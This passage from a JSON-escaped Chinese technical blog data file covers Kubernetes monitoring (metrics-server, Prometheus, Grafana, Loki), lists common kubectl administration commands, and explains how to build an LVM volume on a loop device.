clickhouse-service.clickhouse.svc.cluster.local\\nAddress: 192.168.4.88\\nroot@backend-service-555d6684b5-9kwc7:~# nslookup clickhouse-1-1-0.clickhouse-service.clickhouse\\nServer:         10.43.0.10\\nAddress:        10.43.0.10#53\\nName:   clickhouse-1-1-0.clickhouse-service.clickhouse.svc.cluster.local\\nAddress: 192.168.4.86\\n```\\n\\n## k8s \u76d1\u63a7\\nmetrics-server\\n\u7528\u6765\u91c7\u96c6 k8s \u5404\u79cd\u76d1\u63a7\u6307\u6807\uff0c\u63d0\u4f9b\u7ed9kubectl top\u3001hpa\uff08Horizontal Pod Autoscaler\uff09\u3001vpa\uff08Vertical Pod Autoscaler\uff09\u3001k8s-dashboard \u7b49\u4f7f\u7528\u3002\\n\u6570\u636e\u94fe\u8def\uff1a\\n```text\\n+-----------+      +----------+      +---------------+      +---------+      +--------+\\n|  kubectl  |      | apiserver|      | metrics-server|      | kubelet |      | cgroup |\\n+-----------+      +----------+      +---------------+      +---------+      +--------+\\n      \\\\                 ^                   ^                   ^                ^\\n       \\\\                |                   |                   |                |\\n+-----------+           |                   |                   |                |\\n| dashboard |-----------+                   |                   |                |\\n+-----------+                               |                   |                |\\n      \\\\                                     |                   |                |\\n       \\\\                                    |                   |                |\\n+-----------+                               |                   |                |\\n| scheduler |-------------------------------+                   |                |\\n+-----------+                                                   |                |\\n                                                                |                |\\n                                                                |                |\\n                                                                +----------------+\\n```\\n\\nmetrics-sever \u901a\u8fc7\u91c7\u96c6 kubelet \u63d0\u4f9b\u7684 metrics \u63a5\u53e3\uff08https://nodeip:10250 \u7684 /metrics   /metrics/cadvisor,  /metrics/probes, /metrics/resource\uff09\u7684\u6570\u636e\uff0c\u91c7\u96c6\u6307\u6807\u793a\u4f8b:\\n\\n```text\\n[k8s@k8s-192-168-4-86 ~]$ curl -s -k -H \\"Authorization: Bearer $(kubectl -n kube-system get secrets namespace-controller-token-qwvll -ojson|jq \'.data.token\' -r|base64 -d)\\" https://192.168.4.86:10250/metrics/resource|head -10\\n## HELP container_cpu_usage_seconds_total [ALPHA] Cumulative cpu time consumed by the container in core-seconds\\n## TYPE container_cpu_usage_seconds_total counter\\ncontainer_cpu_usage_seconds_total{container=\\"apiserver\\",namespace=\\"hive2ch\\",pod=\\"hive2ch-apiserver-6fdf5df7f5-lgvgp\\"} 2270.429353976 1722443959650\\ncontainer_cpu_usage_seconds_total{container=\\"backend\\",namespace=\\"sub\\",pod=\\"subscription-backend-7cd788b876-6z74p\\"} 7573.822327467 1722443959713\\ncontainer_cpu_usage_seconds_total{container=\\"calico-node\\",namespace=\\"kube-system\\",pod=\\"canal-xrmh4\\"} 108549.571417276 1722443963395\\ncontainer_cpu_usage_seconds_total{container=\\"clickd\\",namespace=\\"clickhouse\\",pod=\\"clickd-deployment-549944fcf9-2fzzf\\"} 65865.995640873 1722443965340\\ncontainer_cpu_usage_seconds_total{container=\\"clickhouse-server\\",namespace=\\"clickhouse\\",pod=\\"clickhouse-1-1-0\\"} 473112.908558262 1722443956984\\ncontainer_cpu_usage_seconds_total{container=\\"consul-client\\",namespace=\\"consul\\",pod=\\"consul-client-3-0\\"} 103994.031234639 1722443955027\\ncontainer_cpu_usage_seconds_total{container=\\"controller\\",namespace=\\"ingress-nginx\\",pod=\\"nginx-ingress-controller-z46n4\\"} 103172.807361637 1722443959662\\ncontainer_cpu_usage_seconds_total{container=\\"coredns\\",namespace=\\"kube-system\\",pod=\\"coredns-68c65cb45-9hxdn\\"} 43348.132995208 1722443948530\\n```\\n\u518d\u901a\u8fc7 apiserver \u7684 Metrics API \u5bf9\u5185\u63d0\u4f9b\u670d\u52a1\u3002\u5176\u8bbe\u8ba1\u7684\u4e3b\u8981\u76ee\u7684\u662f\u7528\u4e8e autoscaling\uff0c\u4e0d\u5efa\u8bae\u7528\u4f5c\u6307\u6807\u76d1\u63a7\u3002\\n\\n### prometheus\\nprometheus \u662f\u7b2c\u4e8c\u4e2a CNCF \u6258\u7ba1\u7684\u9879\u76ee\uff08\u7b2c\u4e00\u4e2a\u662f k8s\uff09\uff0c\u4e3a k8s \u76d1\u63a7\u91cf\u8eab\u6253\u9020\uff0c\u63d0\u4f9b\u4e86\u5305\u542b\u6307\u6807\u91c7\u96c6\u3001\u5b58\u50a8\u3001\u67e5\u8be2\u4ee5\u53ca\u544a\u8b66\u7b49\u4e00\u5957\u5b8c\u6574\u7684\u80fd\u529b\u3002\\n\\n\u6574\u4f53\u67b6\u6784:\\n```text\\n+------------------+          +---------------------------+          +--------------+          +----------------+\\n| Short-lived jobs |          |      Service discovery    |          | Alertmanager |          |    pagerduty   |\\n+------------------+          | +-----------+ +---------+ |          +--------------+          +----------------+\\n        |                     | | kubernetes | | file_sd| |                | notify                 | Email   |\\n        | push metrics at exit| +-----------+ +---------+ |                |------------------------| etc     |\\n        v                    +----------------------------+                |                         +--------+\\n+--------------+                      | discover targets                push alerts\\n| Pushgateway  |----------------------|------------------------------------\x3e|\\n+--------------+                      v                                     |\\n        |                     +-------------------------------+             |\\n        | pull metrics        |      Prometheus server        |             |\\n        v                     | +-----------+ +-----+ +-----+ |             |\\n+----------------+            | | Retrieval | | TSDB| | HTTP| |             |\\n| Jobs/ exporters|            | +-----------+ +-----+ +-----+ |             |\\n+----------------+            |                               |             |\\n                              +-------------------------------+             |\\n                                       |                                    |\\n                                       v                                    v\\n                                    +------------+                     +------------------+\\n                                    | Node       |                     | Prometheus UI    |\\n                                    | +--------+ |                     +------------------+\\n                                    | |HDD/SSD | |                          |\\n                                    | +-------+| |                          |\\n                                    +------------+                     +------------------+\\n                                                                       |     Grafana      |\\n                                                                       +------------------+\\n                                                                            |\\n                                                                       +------------------+\\n                                                                       |    API clients   |\\n                                                                       +------------------+\\n```\\n\\nprometheus server\u81ea\u5e26\u65f6\u5e8f\u6570\u636e\u5e93\uff0c \u901a\u8fc7\u5185\u7f6e\u7684\u91c7\u96c6\u5668\u4ece k8s \u4ee5\u53ca\u5468\u8fb9\u7ec4\u4ef6\u66b4\u9732\u7684 metrics \u63a5\u53e3\u62c9\u53d6\u6307\u6807\u6570\u636e\uff0c\u540c\u65f6\u4e5f\u8bde\u751f\u4e86\u9488\u5bf9\u5404\u79cd\u7ec4\u4ef6\u7684exporter \uff0c\u8fd9\u4e9b exporter \u901a\u8fc7\u5404\u79cd\u534f\u8bae\u91c7\u96c6\u5bf9\u5e94\u7ec4\u4ef6\u7684\u6307\u6807\uff0c\u518d\u901a\u8fc7 metrics \u63a5\u53e3\u63d0\u4f9b\u7ed9 prometheus \u91c7\u96c6\u3002prometheus \u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u80fd\u529b\u662f\u521b\u5efa\u4e86 promQL \u67e5\u8be2\u8bed\u6cd5\uff0c\u7c7b\u4f3c influxQL\uff0c\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u5185\u7f6e\u51fd\u6570\u5bf9\u6307\u6807\u8fdb\u884c\u8ba1\u7b97\u3001\u805a\u5408\uff0c\u540c\u65f6\u8fd8\u80fd\u901a\u8fc7 promql \u914d\u7f6e\u544a\u8b66\u89c4\u5219\u3002\\nprometheus \u7684 tsdb \u4e0d\u4f9d\u8d56\u5206\u5e03\u5f0f\u5b58\u50a8\uff0c\u597d\u5904\u662f\u7b80\u5355\u597d\u7ef4\u62a4\u5355\u8282\u70b9\u53ef\u8fd0\u884c\uff0c\u4e0d\u597d\u7684\u662f\u672c\u5730\u5b58\u50a8\u6302\u4e86\u6570\u636e\u5c31\u4e22\u4e86\uff0c\u4e3a\u6b64 prometheus \u63d0\u4f9b\u4e86 remote_write/remote_read \u7684\u6807\u51c6\u63a5\u53e3\uff0c\u53ef\u4ee5\u628a\u6570\u636e\u5bf9\u63a5\u5230\u5916\u90e8\u5206\u5e03\u5f0f\u5b58\u50a8\u4e2d\u3002\\npromql \u67e5\u8be2\u793a\u4f8b\uff1a\\n\\n```text\\n## \u8ba1\u7b97\u589e\u957f\u7387\\nrate(demo_api_request_duration_seconds_count[5m])\\n## \u6839\u636e label \u7b5b\u9009\\nnode_cpu_seconds_total{cpu!=\\"0\\",mode=~\\"user|system\\"}\\n## \u6839\u636e\u6570\u503c\u7b5b\u9009\\nnode_filesystem_avail_bytes > 10*1024*1024\\n## 90 \u5206\u4f4d\\nhistogram_quantile(0.9, rate(demo_api_request_duration_seconds_bucket[5m]))\\n## \u5e73\u5747\u503c\\navg_over_time(go_goroutines[5m])\\n```\\n\\n\u66f4\u591a\u8be6\u7ec6\u7528\u6cd5\u53ef\u53c2\u8003\u5b98\u65b9\u624b\u518c\uff1ahttps://prometheus.io/docs/prometheus/latest/querying/basics/\\n\u81ea\u52a8\u5199 ql \u7684 gpt \u5de5\u5177\uff1ahttps://www.yeschat.ai/gpts-9t563RLGy4U-PromQL-Advisor\\n\\n## grafana\\ngrafana \u662f\u4e00\u4e2a\u7cbe\u4e8e\u5c55\u793a\u65f6\u5e8f\u6570\u636e\u7684\u53ef\u89c6\u5316\u5de5\u5177\uff0c\u5177\u6709\u7075\u6d3b\u7684\u56fe\u8868\u5c55\u793a\uff0c\u4e30\u5bcc\u7684\u6570\u636e\u6e90\u652f\u6301\u7b49\u7279\u6027\u3002\u65e9\u671f\u7684 grafana \u662f\u4e00\u4e2a kibana \u7684\u5206\u652f\uff0c\u5176\u5143\u6570\u636e\u5b58\u50a8\u4f9d\u8d56 es\uff0c\u540e\u6765\u91cd\u6784\u6210\u4e00\u4e2a\u7eaf\u524d\u7aef\u7684\u9879\u76ee\uff0c\u56fe\u6807\u5c55\u793a\u80fd\u529b\u66f4\u5f3a\u6027\u80fd\u66f4\u597d\uff0c\u518d\u540e\u6765\u6709\u4e86 golang \u5199\u7684\u540e\u7aef\uff0c\u53ef\u4ee5\u628a\u5143\u6570\u636e\u5b58\u5230 sqlite\u3001mysql\u3001pgsql \u7b49db \u4e2d\uff0c\u540c\u65f6\u652f\u6301\u63d2\u4ef6\u5316\uff0c\u4f8b\u5982\u65b0\u589e\u4e00\u4e2a\u6570\u636e\u6e90\u7c7b\u578b\u53ea\u9700\u8981\u5199\u4e00\u4e2a\u63d2\u4ef6\u3002\u540c\u65f6\u6784\u5efa\u4e86\u5728\u7ebf\u4eea\u8868\u76d8\u5206\u4eab\u793e\u533a\uff0c\u53ef\u4ee5\u65b9\u4fbf\u7684\u5bfc\u5165\u522b\u4eba\u8bbe\u8ba1\u597d\u7684\u4eea\u8868\u76d8\u3002\u968f\u7740\u4e91\u539f\u751f\u53ca k8s \u7684\u53d1\u5c55\uff0cgrafana \u987a\u52bf\u6210\u4e3a k8s \u76d1\u63a7\u53ef\u89c6\u5316\u7684\u6700\u4f73\u642d\u6863\u3002\u4e0d\u4ec5\u5982\u6b64\uff0cgrafana \u80cc\u540e\u516c\u53f8\u7ee7\u7eed\u671d\u53ef\u89c2\u6d4b\u6027\u9886\u57df\u53d1\u529b\uff0c\u5728 metrics\u3001logs\u3001trace \u65b9\u5411\u90fd\u6709\u5bf9\u5e94\u7684\u4ea7\u54c1\u63a8\u51fa\uff0c\u4f8b\u5982\u6211\u4eec\u7528\u5230\u7684 loki \u4e5f\u662f\u51fa\u81ea GrafanaLabs \u3002\\n\\n## Loki\\n\\nLoki \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u65e5\u5fd7\u6536\u96c6\u7cfb\u7edf\uff0c\u5176\u529f\u80fd\u662f\u6536\u96c6\u3001\u5b58\u50a8\u548c\u67e5\u8be2\u65e5\u5fd7\u3002 Loki \u538b\u7f29\u65e5\u5fd7\u5e76\u5c06\u65e5\u5fd7\u5b58\u50a8\u5728\u5757\u4e2d\uff0c\u5e76\u5c06\u5b83\u4eec\u5b58\u50a8\u5728\u6587\u4ef6\u7cfb\u7edf\u6216 AWS S3 \u7b49\u540e\u7aef\u5b58\u50a8\u4e2d\u3002\\n\u5757\uff08chunk\uff09\u662f\u4e00\u4e2a\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u57fa\u4e8e\u65e5\u5fd7\u5377\u7684\u65e5\u5fd7\u6761\u76ee\uff0c\u56e0\u6b64\u5f53\u5757\u5927\u5c0f\u8fbe\u5230\u5176\u5927\u5c0f\u9650\u5236\u65f6\uff0c\u5b83\u4f1a\u5c06\u65e5\u5fd7\u5b58\u50a8\u5728\u53e6\u4e00\u4e2a\u5757\u4e2d\u3002\u6bcf\u5f53\u5b58\u50a8\u4e00\u4e2a\u5757\u65f6\uff0c\u5b83\u90fd\u4f1a\u4e3a\u6bcf\u4e2a\u5757\u521b\u5efa\u4e00\u4e2a\u7d22\u5f15\uff08index\uff09\u3002\u7d22\u5f15\u4e0d\u5305\u542b\u65e5\u5fd7\u7684\u5185\u5bb9\uff0c\u5b83\u53ea\u5305\u542b\u65f6\u95f4\u6233\u3001\u5757\u7684\u6807\u7b7e\u548c\u5757\u7684\u4f4d\u7f6e\u3002\\nloki \u7279\u6027\uff1a \u6a2a\u5411\u6269\u5bb9\u3001\u591a\u79df\u6237\u3001\u65e5\u5fd7\u91c7\u96c6\u5c55\u793a\u3001\u65e5\u5fd7\u544a\u8b66\\n```text\\n+-------------------------+-------------------------------+-------------+\\n|      Timestamp          |    Prometheus-style Labels    |   Content   |\\n| with nanosecond precision|        key-value pairs        |   logline   |\\n|        indexed          |            indexed            |  unindexed  |\\n+-------------------------+-------------------------------+-------------+\\n| 2019-12-11T10:01:02.123456789Z | {app=\\"nginx\\", cluster=\\"us-west1\\"} | GET /about |\\n```\\n\\nloki \u6570\u636e\u6d41\uff1a\\n\\n```text\\n+-----------------+       +-----------------+\\n|    NODE 1       |       |    NODE 2       |\\n| +-------------+ |       | +-------------+ |\\n| | Application | |       | | Application | |\\n| +-------------+ |       | +-------------+ |\\n|      |          |       |      |          |\\n| Write Logs      |       | Write Logs      |\\n|      v          |       |      v          |\\n| +-------------+ |       | +-------------+ |\\n| |   Promtail  | |       | |   Promtail  | |\\n| +-------------+ |       | +-------------+ |\\n+--------|--------+       +--------|--------+\\n         |                         |\\n         +-----------+-------------+\\n                     |\\n        +-------------------------+\\n        |          Loki           |\\n        | +---------+  +---------+|\\n        | |Distributor|          ||\\n        | +---------+  +---------+|\\n        |      |          |       |\\n        |   +---------+  +---------+  +--------------+\\n        |   | Ingester|  | Querier |  |Query Frontend|\\n        |   +---------+  +---------+  +--------------+\\n        |      |          ^              ^\\n        |      v          |              |\\n        |   +---------+   |              |\\n        |   |  Ruler  |< -+              |\\n        |   +---------+                  |\\n        |                                |\\n        | +------------------+ +------------------+\\n        | |  Index           | |  Chunks          |\\n        | | /var/lib/loki/   | | /var/lib/loki/   |\\n        | | /index           | | /chunks          |\\n        | +------------------+ +------------------+\\n        +-------------------------------------------+\\n            |                         |\\n            v                         v\\n+-------------------+         +------------------+\\n| Email Notification|         | Visualize Logs   |\\n+-------------------+         +------------------+\\n                                      |\\n                                 +--------+\\n                                 | Grafana|\\n                                 +--------+\\n```\\n\\n### \u6a21\u5757\u4ecb\u7ecd\\npromtail\uff1a\u8d1f\u8d23\u91c7\u96c6pod\u65e5\u5fd7\u7684 agent\uff0c\u4ee5 daemonset \u90e8\u7f72\u5728\u6bcf\u4e2a\u8282\u70b9\uff0ck8s \u4e2d\u5bbf\u4e3b\u673a\u4e0a\u4e5f\u90e8\u7f72\u6709\u72ec\u7acb\u7684 promtail \u7ec4\u4ef6\uff0c\u7528\u6765\u91c7\u96c6\u5bbf\u4e3b\u673a\u90e8\u7f72\u7684\u7ec4\u4ef6\u65e5\u5fd7\uff1b\\ndistributor\uff1a\u4ee5deploy\u65b9\u5f0f\u90e8\u7f72\uff0c\u662f\u4e00\u4e2a\u65e0\u72b6\u6001\u7ec4\u4ef6\uff0c\u8d1f\u8d23\u5904\u7406\u3001\u8fc7\u6ee4\u7531 promtail \u53d1\u9001\u8fc7\u6765\u7684\u65e5\u5fd7\u6d41\u6570\u636e\uff0c\u5e76\u5206\u53d1\u5230 ingester\uff1b\\ningester\uff1a\u7528statefulset\u90e8\u7f72\uff0c\u63a5\u6536\u5230\u6765\u81eadistributor \u7684\u65e5\u5fd7\u540e\u8d1f\u8d23\u65e5\u5fd7\u6570\u636e\u7684\u5b58\u50a8\u548c\u7d22\u5f15\uff0c\u4e5f\u80fd\u5b9a\u671f\u5c06\u65e5\u5fd7\u53d1\u5f80\u5bf9\u8c61\u5b58\u50a8\u5982 s3 \u517c\u5bb9\u7684\u6301\u4e45\u6027\u5b58\u50a8\u7cfb\u7edf\uff1b\\nquerier\uff1a\u7528statefulset\u90e8\u7f72\uff0c\u8d1f\u8d23\u6267\u884c logQL \u67e5\u8be2\uff0c\u4ece ingester \u4e2d\u67e5\u8be2\u65e5\u5fd7\u6570\u636e\uff0c\u5bf9\u67e5\u8be2\u7ed3\u679c\u505a\u805a\u5408\u3001\u8fc7\u6ee4\u7b49\uff1b\\nquery-frontend\uff1a\u4ee5deploy\u65b9\u5f0f\u90e8\u7f72\uff0c\u65e0\u72b6\u6001\u670d\u52a1\uff0c\u8d1f\u8d23\u63a5\u6536\u6765\u81ea\u5ba2\u6237\u7aef\uff08\u547d\u4ee4\u884c cli\u3001grafana \u7b49\uff09\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5c06\u5927\u67e5\u8be2\u62c6\u6210\u591a\u4e2a\u5c0f\u67e5\u8be2\uff1b\\n\\npromtail.yaml\u914d\u7f6e\u793a\u4f8b\uff1a\\n```yaml\\n  - job_name: mysql-server-slow-query-job\\n    static_configs:\\n      - targets:\\n          - localhost\\n        labels:\\n          __path__: /data00/mysql/log3406/slow_query.log\\n          component: \\"MySQL\\"\\n          service: \\"MysqlServer\\"\\n          type: \\"SlowQuery\\"\\n          hostName: k8s-192-168-4-86\\n          hostIp: 192.168.4.86\\n          logLevel: INFO\\n    pipeline_stages:\\n      - match:\\n          selector: \'{service=\\"MysqlServer\\"}\'\\n          stages:\\n            - multiline:\\n                firstline: \'^# Time:\'\\n                max_lines: 128\\n```\\n\\n### logQL \u67e5\u8be2\\n\u67e5\u8be2\u5206\u4e24\u7c7b\uff0cmetrics \u67e5\u8be2\u548c\u65e5\u5fd7\u67e5\u8be2\\n\u65e5\u5fd7\u67e5\u8be2\uff1a\\n```bash\\nlogcli labels  #\u67e5\u6240\u6709 label\\nlogcli labels service  # \u67e5\u6307\u5b9a label\\n## \u67e5\u6307\u5b9alabel \u7684\u65e5\u5fd7\\nlogcli query \'{service=\\"k8s/backend-service\\"}\'\\n## limit\u63a7\u5236\u67e5\u8be2\u884c\u6570\\nlogcli query \'{service=\\"k8s/backend-service\\"}\' -q -o raw --limit 10\\n## \u652f\u6301\u6b63\u5219\u5339\u914d\u5173\u952e\u5b57\\nlogcli query \'{service=\\"k8s/backend-service\\"} |~ \\".*WARNING.*|.*ERROR.*\\"\' -q -o raw\\n## host label \u7b5b\u9009\u8282\u70b9\\nlogcli query \'{service=\\"k8s/backend-service\\",host=\\"172.16.0.126\\"}\' -q -o raw\\n## \u6307\u5b9a\u67e5\u8be2\u65f6\u95f4\u8303\u56f4\\nlogcli query \'{service=\\"k8s/backend-service\\"}\' -q  --from=\\"2022-12-24T00:00:00Z\\" --to=\\"2022-12-24T02:00:00Z\\"\\n## -f \u7c7b\u4f3c tail -f \u5b9e\u65f6\u6eda\u52a8\u6700\u65b0\u65e5\u5fd7\\nlogcli query \'{service=\\"k8s/backend-service\\"} \' -q -o raw -f\\n```\\n\\n\u65e5\u5fd7 Metrics \u67e5\u8be2\uff1a\\nloki \u652f\u6301\u5404\u79cd\u805a\u5408\u51fd\u6570\u548c\u8fd0\u7b97\u5bf9\u65e5\u5fd7\u8fdb\u884c\u805a\u5408\uff0c\u4ece\u65e5\u5fd7\u4e2d\u5f97\u5230\u6307\u6807\u6570\u636e\uff0c\u57fa\u4e8e\u65e5\u5fd7\u7684\u544a\u8b66\u7b49\uff0c\u4f8b\u5982\uff1a\\n```text\\n## 10\u5206\u949f\u5185ERROR\u65e5\u5fd7\u8fc7\u591a\\ncount_over_time({host=~\\"xxxx\\"}|~\\"error\\"[10m]) > 100\\n\\n## \u65e5\u5fd7\u9519\u8bef\u7387\u8d85\u8fc7 1%\\nsum(rate({service=\\"xxx\\"} |= \\"error\\" [1m])) by (job) / sum(rate({service=\\"xxx\\"}[1m])) by (service) > 0.01\\n```\\n\\nmetrics \u67e5\u8be2\u51fd\u6570\u53ef\u53c2\u8003\uff1a https://grafana.com/docs/loki/latest/query/metric_queries/\\n\\n\\n## k8s\u5e38\u7528\u547d\u4ee4\\n\\n```bash\\n## json\u683c\u5f0f\u8f93\u51fa\uff0cjq \u547d\u4ee4\u89e3\u6790\u5b57\u6bb5\\nkubectl get svc prom-prometheus-server -n monitoring -o json | jq -r \'.spec.clusterIP\') \\n## \u901a\u8fc7-o \u6307\u5b9a\u8f93\u51fa\u5b57\u6bb5\\nkubectl get nodes --no-headers -o custom-columns=NAME:.metadata.name\\n## \u6309\u8282\u70b9\u7edf\u8ba1\u8fd0\u884c\u4e2d pod \u4e2a\u6570\\nkubectl get pod -A -o wide --no-headers |awk \'{print $4,$8}\' |grep -v Completed |awk \'{print $2}\' |sort |uniq -c\\n## \u76f4\u63a5\u8bf7\u6c42 apisever \u63a5\u53e3\\nkubectl get --raw /api/v1/nodes/\\"$nodename\\"/proxy/stats/summary \\n## \u6839\u636e pod label \u67e5\u8be2\u65e5\u5fd7\\nkubectl -n $ns logs -l $labels\\n## \u67e5\u627e\u6240\u6709\u5305\u542b\u67d0\u4e2a\u5173\u952e\u5b57\u7684 deploy\\nkubectl get deploy -A --no-headers |awk \'{print $1,$2}\'|while read -r ns dp;do if kubectl -n $ns describe deploy $dp|grep -Eq \'hadoop-conf|hive-conf|spark-conf\'; then echo $ns $dp;fi;done\\n## \u67e5\u770b\u4e00\u4e2a pod \u6700\u540e\u4e00\u6b21\u6302\u6389\u7684\u65e5\u5fd7\\nkubectl -n monitoring logs k8s-fronted-monitor-f76fc4c88-n29xs -p\\n## \u5bb9\u5668\u5185\u65e0\u76f8\u5173\u547d\u4ee4\u65f6\uff0c\u4ece\u5bb9\u5668\u7f51\u7edc\u5185\u5f80\u5916\u53d1\u9001\u7f51\u7edc\u8bf7\u6c42\\ndocker inspect 51472f1ec767 | grep Pid  # \u627e\u5230 pid\\nsudo nsenter -t 208696 -n curl xxx.com  # \u4f7f\u7528 nsenter \u547d\u4ee4\u8fdb\u5165\u5bb9\u5668\u7f51\u7edc\u5e76\u6267\u884c\u672c\u5730\u547d\u4ee4\\n## \u67e5\u770b events \u4e8b\u4ef6\u6d88\u606f\uff0c\u4f8b\u5982 pod \u4e00\u76f4 pending\uff0cpod \u62c9\u8d77\u5931\u8d25\u7b49\u573a\u666f\\nkubectl -n k8s get events\\n## \u67e5\u770b kubelet \u65e5\u5fd7\\ndocker logs kubelet -f --tai 100\\n## \u4f7f\u7528\u6307\u5b9a\u955c\u50cf\u8fd0\u884c\u4e34\u65f6\u5bb9\u5668\uff0c\u53ef\u8fdb\u5165\u5bb9\u5668\u67e5\u770b\u6587\u4ef6\u5185\u5bb9\u7b49\\nkubectl run -it --rm --attach --image=registry.xxx.com:5000/xxx:vxxx  debugpod -- bash\\n## \u67e5\u627epid\u6240\u5c5e\u7684 container\\n/tmp/hlkit1000/bin/pid-container.sh 3626508\\n```\\n\\n## \u62d3\u5c55\u9605\u8bfb\\n1. https://kubernetes.io/zh-cn/docs/reference/kubectl/\\n2. https://grafana.com/docs/loki/latest/query/log_queries/\\n3. https://docs.nginx.com/nginx-ingress-controller/overview/design/"},{"id":"/2023/12/25/create-loop-lvm","metadata":{"permalink":"/notes/blog/2023/12/25/create-loop-lvm","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2023-12-25-create-loop-lvm.md","source":"@site/blog/2023-12-25-create-loop-lvm.md","title":"\u5982\u4f55\u901a\u8fc7loop\u6a21\u62df\u4e00\u4e2alvm\u903b\u8f91\u5377","description":"\u5e74\u7eaa\u5927\u4e86\u8bb0\u6027\u4e0d\u597d","date":"2023-12-25T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":0.83,"hasTruncateMarker":false,"authors":[{"name":"\u8001\u53f8\u673a","title":"Maintainer of this proj","url":"https://github.com/itxx00","imageURL":"https://github.com/itxx00.png","key":"itxx00","page":null}],"frontMatter":{"layout":"post","title":"\u5982\u4f55\u901a\u8fc7loop\u6a21\u62df\u4e00\u4e2alvm\u903b\u8f91\u5377","authors":"itxx00","description":"\u5e74\u7eaa\u5927\u4e86\u8bb0\u6027\u4e0d\u597d","categories":["shell","system"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"k8s\u57fa\u7840\u77e5\u8bc6\u603b\u7ed3","permalink":"/notes/blog/2025/08/07/k8s-basic"},"nextItem":{"title":"\u666e\u901a\u7528\u6237\u6267\u884csystemctl\u542f\u505c\u670d\u52a1\u7981\u7528\u5bc6\u7801\u8ba4\u8bc1","permalink":"/notes/blog/2023/02/02/non-root-systemd"}},"content":"\u67d0\u4e9b\u65f6\u5019\u6211\u4eec\u9700\u8981\u4e00\u4e2alvm\u903b\u8f91\u5377\uff0c\u4f46\u662f\u53c8\u6ca1\u6709\u591a\u4f59\u7684\u78c1\u76d8\u8bbe\u5907\u53ef\u7528\uff0c\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u6a21\u62df\u7684\u65b9\u5f0f\u521b\u5efa\u4e00\u4e2a\u8bbe\u5907\u51fa\u6765\uff0c\u6b65\u9aa4\u5982\u4e0b\uff1a\\n```bash\\n# \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u865a\u62dfblock\u6587\u4ef6\\ndd if=/dev/zero of=pv1 bs=1M count=5000\\n# \u7136\u540e\u901a\u8fc7losetup\u5c06\u5176\u6302\u8f7d\u5230loop0\u8bbe\u5907\u4e0a\\nsudo losetup /dev/loop0 pv1\\n# \u67e5\u770b\u72b6\u6001\\nsudo losetup\\n# \u8fd9\u65f6\u53ef\u4ee5\u5bf9loop0\u8bbe\u5907\u8fdb\u884c\u64cd\u4f5c\uff0c\u5f53\u505a\u4e00\u4e2ablock\u8bbe\u5907\u4f7f\u7528\\nsudo pvcreate /dev/loop0\\nsudo vgcreate vg0 /dev/loop0\\nsudo lvcreate -n lv0 -l 100%FREE vg0\\n# \u521b\u5efa\u597dlv\u4e4b\u540e\u5c31\u53ef\u4ee5\u7ee7\u7eed\u683c\u5f0f\u5316\u6587\u4ef6\u7cfb\u7edf\\nsudo mkfs.ext4 /dev/vg0/lv0\\nsudo mkdir /data01\\nsudo mount /dev/vg0/lv0 /data01\\n```\\n\u8fd9\u6837\u6211\u4eec\u5c31\u5b8c\u6210\u4e86\u901a\u8fc7dd\u51fa\u4e00\u4e2a\u7a7a\u6587\u4ef6\uff0c\u7136\u540e\u901a\u8fc7loop\u8bbe\u5907\u6a21\u62df\u4e86\u4e00\u4e2alvm\u903b\u8f91\u5377\u51fa\u6765\u3002\\n\u4f7f\u7528\u5b8c\u4e4b\u540e\u6e05\u7406\uff1a\\n```\\nsudo umount /data01\\nsudo lvremove /dev/vg0/lv0\\nsudo vgremove vg0\\nsudo pvremove /dev/loop0\\nsudo losetup -d /dev/loop0\\nrm pv1\\n```"},{"id":"/2023/02/02/non-root-systemd","metadata":{"permalink":"/notes/blog/2023/02/02/non-root-systemd","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2023-02-02-non-root-systemd.md","source":"@site/blog/2023-02-02-non-root-systemd.md","title":"\u666e\u901a\u7528\u6237\u6267\u884csystemctl\u542f\u505c\u670d\u52a1\u7981\u7528\u5bc6\u7801\u8ba4\u8bc1","description":"\u5e74\u7eaa\u5927\u4e86\u8bb0\u6027\u4e0d\u597d","date":"2023-02-02T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":0.63,"hasTruncateMarker":false,"authors":[{"name":"\u8001\u53f8\u673a","title":"Maintainer of this proj","url":"https://github.com/itxx00","imageURL":"https://github.com/itxx00.png","key":"itxx00","page":null}],"frontMatter":{"layout":"post","title":"\u666e\u901a\u7528\u6237\u6267\u884csystemctl\u542f\u505c\u670d\u52a1\u7981\u7528\u5bc6\u7801\u8ba4\u8bc1","authors":"itxx00","description":"\u5e74\u7eaa\u5927\u4e86\u8bb0\u6027\u4e0d\u597d","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"\u5982\u4f55\u901a\u8fc7loop\u6a21\u62df\u4e00\u4e2alvm\u903b\u8f91\u5377","permalink":"/notes/blog/2023/12/25/create-loop-lvm"},"nextItem":{"title":"influxQL\u5e38\u7528\u8bed\u53e5\u6574\u7406","permalink":"/notes/blog/2022/12/28/influxdb-ql-use-case"}},"content":"\u5728CentOS\u7cfb\u7edf\u4e2d\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u666e\u901a\u7528\u6237\u7ba1\u7406\u7cfb\u7edf\u670d\u52a1\u542f\u505c\u4f1a\u8981\u6c42\u8ba4\u8bc1\uff0c\u8f93\u51fa\u7c7b\u4f3c\u5982\u4e0b\uff1a\\n```bash\\nsystemctl restart xxx\\n==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===\\nAuthentication is required to manage system services or units.\\nAuthenticating as: 